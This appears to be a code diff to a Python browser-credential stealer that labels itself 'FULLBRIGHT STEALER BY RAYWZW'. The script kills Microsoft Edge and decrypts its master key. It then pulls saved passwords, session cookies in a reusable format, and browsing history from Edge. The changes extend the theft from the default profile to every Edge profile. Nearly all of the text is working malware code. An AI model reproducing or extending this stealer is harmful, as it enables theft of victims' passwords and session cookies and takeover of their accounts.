@@ -3,8 +3,7 @@ from win32crypt import CryptUnprotectData
 from Crypto.Cipher import AES
 appdata = os.getenv('LOCALAPPDATA')
 user = os.path.expanduser("~")
-edge_path = os.path.join(appdata, 'Microsoft', 'Edge', 'User Data', 'Default')
-
+edge_path = [os.path.join(appdata, 'Microsoft', 'Edge', 'User Data', p) for p in os.listdir(os.path.join(appdata, 'Microsoft', 'Edge', 'User Data')) if os.path.isdir(os.path.join(appdata, 'Microsoft', 'Edge', 'User Data', p))]
 def kill_edge():
     for proc in psutil.process_iter(['pid', 'name']):
         if 'msedge.exe' in proc.info['name'].lower():
@@ -30,7 +29,6 @@ def get_master_key():
     if "encrypted_key" not in local_state["os_crypt"]:
         print("No 'encrypted_key' field found in 'os_crypt'.")
         return None
-
     encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
     try:
         master_key = CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
@@ -46,7 +44,6 @@ def decrypt_password(buff, master_key):
         return cipher.decrypt(payload)[:-16].decode()
     except Exception as e:
         return ""
-
 def extract_data_from_db(db_path, query, process_row, temp_prefix):
     if not os.path.exists(db_path):
         return None
@@ -72,8 +69,11 @@ def get_login_data(master_key):
                 return ""
         return ""
     header = "------------FULLBRIGHT STEALER BY RAYWZW------------\n"
-    data = extract_data_from_db(os.path.join(edge_path, 'Login Data'), query, process_row, 'login_db')
+    data = ""
+    for path in edge_path:
+        data += extract_data_from_db(os.path.join(path, 'Login Data'), query, process_row, 'login_db') or ''
     return header + data
+
 def get_cookies():
     query = 'SELECT name, value, host_key, path, expires_utc FROM cookies'
     def process_row(row):
@@ -81,7 +81,11 @@ def get_cookies():
             host = row[2] if row[2].startswith('.') else '.' + row[2]
             return f"{host}\tTRUE\t{row[3]}\tTRUE\t{row[4]}\t{row[0]}\t{row[1]}\n"
         return ""
-    return extract_data_from_db(os.path.join(edge_path, 'Network', 'Cookies'), query, process_row, 'cookies_db')
+    data = ""
+    for path in edge_path:
+        data += extract_data_from_db(os.path.join(path, 'Network', 'Cookies'), query, process_row, 'cookies_db') or ''
+    return data
+
 def get_history():
     query = 'SELECT url, title, visit_count, last_visit_time FROM urls ORDER BY last_visit_time ASC'
     def process_row(row):
@@ -89,8 +93,11 @@ def get_history():
         return f"URL: {row[0]}\nTitle: {row[1]}\nVisit Count: {row[2]}\nLast Visited: {last_visited}\n----------------------\n"
     
     header = "------------FULLBRIGHT STEALER BY RAYWZW------------\n"
-    data = extract_data_from_db(os.path.join(edge_path, 'History'), query, process_row, 'history_db')
+    data = ""
+    for path in edge_path:
+        data += extract_data_from_db(os.path.join(path, 'History'), query, process_row, 'history_db') or ''
     return header + data
+
 def random_filename(prefix):
     return f"{prefix}_{''.join(random.choices(string.ascii_lowercase + string.digits, k=6))}"
 def save_results(logins, cookies, history):
